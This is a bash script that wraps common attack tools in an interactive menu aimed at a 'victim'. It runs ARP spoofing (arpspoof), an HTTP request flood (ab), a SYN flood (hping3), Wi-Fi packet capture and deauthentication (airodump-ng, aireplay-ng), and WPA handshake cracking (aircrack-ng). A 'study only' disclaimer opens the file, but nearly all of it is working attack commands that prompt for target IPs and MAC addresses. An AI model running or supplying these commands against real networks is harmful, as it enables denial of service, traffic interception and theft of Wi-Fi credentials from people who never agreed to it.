#!/bin/bash
read -p "this bash,was only for study,there is nobody will pay for accident.ALL YOUR FAULT,not mine.SO choose 1 to use the tool,choose 0 to exit." choose
case $choose in
1)
echo ""
;;
0)
exit
;;
*)
exit
;;
esac
while true; do
    clear
    echo "please use it with superuser."
    echo "1)choose to ifconfig"
    echo "2)choose to arpspoof"
    echo "3)choose to cc f*cked"
    echo "4)choose to dos <just hping3 SYN flood>"
    echo "5)choose to fastfetch"
    echo "6)choose to collect pack from nearby with aircrack-ng"
    echo "7)choose to deauth the device from the AP with aircrack-ng"
    echo "8)choose crack the pack with aircrack-ng"
    echo "i)choose to install tools"
    read -p "Enter a value: " choice

    case $choice in
        1)#tool
            ifconfig
            ;;
        i|I)
            sudo apt update
            sudo apt install wireless-tools -y
            sudo apt install apache2-utils -y
            sudo apt install fastfetch -y
            sudo apt install hping3 -y
            sudo apt install dsniff -y
            sudo apt install python3-scapy -y
            sudo apt install rfkill -y
            ;;
        2)
        #arpspoof hack
            read -p "Enter the victim IP: " victim_ip
            read -p "Enter the gateway IP: " gateway_ip
            echo "got it"
            echo "victim is: "$victim_ip
            echo "gateway is: "$gateway_ip
            read -p "Press Enter to hack"
            sudo arpspoof -t $victim_ip -r $gateway_ip
            ;;

        3)#cc f*cked
            read -p "Enter the victim IP: " victim_ip
            read -p "Enter the requests times numbers: (max 20000) " req_num
            read -p "Enter the requests at a time: (max 1000) " req_a_time
            echo "got it."
            echo "victim is: " $victim_ip
            echo "req time is: " $req_num
            echo "req a time is: " $req_a_time
            read -p "Press Enter to hack"
            ab -n $req_num -c $req_a_time $victim_ip/
        ;;

    4)#dos f*cked
        read -p "Enter victim ip: " victim_ip
        echo "got it."
        echo "victim is: " $victim_ip
        read -p "Press Enter to hack"
        sudo hping3 -S --flood $victim_ip
        ;;

    5)#fastfetch
        fastfetch
        ;;

    6)#collect pack from nearby
        echo "all devices will unblock"
        sudo rfkill unblock
        echo "look-up the wlan device."
        sudo airmon-ng
        read -p "look-up nearby wlan signal.And please input your device name: " wlan_devices
        sudo airmon-ng start $wlan_devices
        read -p "input hack device which it has been M.O.N ed: " wlan_devices
        sudo airodump-ng "$wlan_devices"
        read -p "have a name for your catch pack: " pack_name
        read -p "input your channel.No: " ch_num
        read -p "input the target MAC address: " victim_mac
        read -p "input your device to catch the packs: " hack_device
        echo "got it."
        echo "your victim MAC is: " $victim_mac
        echo "your victim channel.No is: "$ch_num
        echo "your pack name is: "$pack_name
        echo "your internet device is "$hack_device
        read -p "Press ENTER to hack"
        sudo airodump-ng -c $ch_num -w $pack_name --bssid $victim_mac $wlan_devices
        read -p "input your M.O.N interface: " mon_itf
        sudo airmon-ng stop $mon_itf
        ;;

    7)#deauth connect hack
        echo "this deauth hack tool."
        read -p "input your hack from,AP" ap_mac
        read -p "input your hack target,USER" victim_mac
        read -p "input your hack_device" hack_device
        aireplay-ng --deauth 3 -a $ap_mac -c $victim_mac $hack_device
        ;;

    8)#internet pack(handshake pack)crack
        read -p "input your cap" catch_cap
        read -p "input your wordlist" word_list
        echo "got it"
        echo "your cap pack is: "$catch_cap
        echo "your wordlist is: "$word_list
        read -p "press ENTER to hack."
        aircrack-ng $catch_cap -w $word_list
        ;;

        *)
            echo "sync error,please choose again."
            ;;
    esac

    echo ""
    read -p "wait for ENTER..."  
done
